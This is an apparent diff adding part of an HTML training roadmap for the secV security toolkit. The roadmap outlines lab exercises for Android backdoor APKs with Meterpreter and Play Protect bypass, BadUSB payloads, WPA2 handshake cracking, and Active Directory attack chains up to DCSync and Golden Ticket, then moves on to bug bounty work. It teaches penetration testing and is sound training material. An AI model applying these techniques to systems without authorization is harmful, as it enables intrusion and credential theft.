+        <div class="step-body">Read android_pentest backdoor + Play Protect bypass sections. Read badusb full page. Generate and understand every byte of an msfvenom APK.</div>
+        <pre class="step-code">Lab: backdoor_apk → inspect with jadx → catch Meterpreter → run sysinfo
+Also: generate badusb payload → trace every DuckyScript line to HID report bytes</pre>
+      </div>
+    </li>
+    <li class="step-item">
+      <div class="step-num">8</div>
+      <div class="step-content">
+        <div class="step-title">WiFi Security</div>
+        <div class="step-body">Read wifi_monitor 802.11 frame section + WPA2 handshake. Get a USB WiFi adapter (TP-Link TL-WN722N). Read aircrack-ng wiki capture tutorial.</div>
+        <pre class="step-code">Lab: capture your own home WPA2 handshake → run hashcat with rockyou.txt
+Goal: if your password is cracked, change it. If not, understand why rockyou failed.</pre>
+      </div>
+    </li>
+    <li class="step-item">
+      <div class="step-num">9</div>
+      <div class="step-content">
+        <div class="step-title">Active Directory — The Core</div>
+        <div class="step-body">Read windowsAD Kerberos + LDAP sections. Complete TryHackMe "Attacktive Directory" room. Set up GOAD or VulnAD lab.</div>
+        <pre class="step-code">Lab: windowsAD assess on GOAD → read BloodHound graph → find path to Domain Admin
+Deep: understand every Kerberos packet in the DCSync chain</pre>
+      </div>
+    </li>
+    <li class="step-item">
+      <div class="step-num">10</div>
+      <div class="step-content">
+        <div class="step-title">Active Directory — Full Chain</div>
+        <div class="step-body">Kerberoast, crack TGS hash, use credential to escalate, DCSync, Golden Ticket. Document the full chain as a pentest report.</div>
+        <pre class="step-code">Lab: windowsAD kerberoast → hashcat → escalate → dcsync → golden_ticket
+Goal: written report: vulnerability, evidence, business impact, remediation</pre>
+      </div>
+    </li>
+    <li class="step-item">
+      <div class="step-num">11</div>
+      <div class="step-content">
+        <div class="step-title">Customization — Make It Yours</div>
+        <div class="step-body">Read every module's Customization section. Write a new operation for any module. Add a new DuckyScript delivery template. Write a custom Frida script.</div>
+        <pre class="step-code">Goal: contribute something new to secV — a new payload type, detector, or operation
+Read: each module's customization guide → pick one → implement it → test it</pre>
+      </div>
+    </li>
+    <li class="step-item">
+      <div class="step-num">12</div>
+      <div class="step-content">
+        <div class="step-title">Real Engagements</div>
+        <div class="step-body">Apply for your first bug bounty program (HackerOne or Bugcrowd — start with programs that allow web testing). Study the scope carefully. Use secV for recon and scanning. Document every finding properly.</div>
+        <pre class="step-code">Or: take eJPT / PNPT certification exam — all skills from weeks 1–11 directly apply
+Mindset: the tools are just tools. Understanding the WHY is what makes you dangerous.</pre>
+      </div>
+    </li>
+  </ul>
+</div>
+
+<footer>
+  <div class="footer-logo">secV</div>
+  <div class="footer-text">Foundations · Start Here · secvulnhub.github.io</div>
+  <a href="index.html" style="font-size:.54rem;color:var(--dust);text-decoration:none;">← Back to Module Index</a>
+</footer>
+
+<script>
+window.addEventListener('scroll', () => {
+  document.getElementById('nav').classList.toggle('scrolled', window.scrollY > 40);
+});
+</script>
+</body>
+</html>
